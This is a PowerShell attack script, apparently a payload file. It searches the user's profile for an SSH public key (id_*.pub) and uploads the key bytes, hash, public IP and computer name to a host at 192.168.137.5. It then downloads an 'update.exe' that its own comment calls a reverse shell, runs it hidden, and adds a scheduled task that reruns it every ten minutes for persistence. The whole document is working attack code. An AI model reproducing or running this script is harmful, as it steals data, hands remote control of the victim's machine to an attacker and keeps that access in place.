& {
    $logFile = "$env:TEMP\payload_log.txt"
    Add-Content $logFile "=== Script started at $(Get-Date) ==="

    # Get public IP (optional)
    try {
        $p = (Invoke-WebRequest https://api.ipify.org -UseBasicParsing -TimeoutSec 5 | Select -Exp Content)
        Add-Content $logFile "Public IP: $p"
    } catch {
        $p = "unknown"
        Add-Content $logFile "Failed to get public IP: $_"
    }

    # Find id_*.pub file
    Add-Content $logFile "Searching for id_*.pub in $env:USERPROFILE"
    $f = Get-ChildItem $env:USERPROFILE -Recurse -Include '*.pub' -File -Force -ErrorAction SilentlyContinue |
         Where-Object { $_.Name -like 'id_*.pub' } | Select -First 1

    if ($f) {
        Add-Content $logFile "Found file: $($f.FullName)"
        # Read the file as raw bytes
        $bytes = [System.IO.File]::ReadAllBytes($f.FullName)

        # Write first 100 bytes to log
        $first100 = [System.BitConverter]::ToString($bytes[0..([Math]::Min(99, $bytes.Length-1))])
        Add-Content $logFile "First 100 bytes: $first100"

        Add-Content $logFile "Bytes read: $($bytes.Length)"
        # Compute SHA256 hash of the file
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $hash = $sha256.ComputeHash($bytes)
        $hashString = [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
        Add-Content $logFile "SHA256 of file: $hashString"
    } else {
        Add-Content $logFile "No file found. Sending 'Not found'"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes('Not found')
        $hashString = "none"
    }

    # Build the URI with the computer name
    $u = "http://192.168.137.5:8080/$env:COMPUTERNAME"

    # Create a WebClient and set headers
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('X-Message', 'Jeeva Halal')
    $wc.Headers.Add('X-Public-IP', $p)
    $wc.Headers.Add('X-File-Hash', $hashString)       # send hash for verification
    $wc.Headers.Add('Content-Type', 'application/octet-stream')   # raw binary

    # Upload raw bytes
    try {
        $response = $wc.UploadData($u, 'POST', $bytes)
        Add-Content $logFile "UploadData succeeded. Response: $([System.Text.Encoding]::UTF8.GetString($response))"
    } catch {
        Add-Content $logFile "UploadData failed: $_"
    }

    # Download and run reverse shell
    $wc.DownloadFile('http://192.168.137.5:5000/download/update.exe', "$env:TEMP\update.exe")
    Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden

    # Create persistence
    $rn = [guid]::NewGuid().ToString().Substring(0,8)
    schtasks /create /tn $rn /tr "$env:TEMP\update.exe" /sc minute /mo 10 /f

    Add-Content $logFile "=== Script finished ==="
}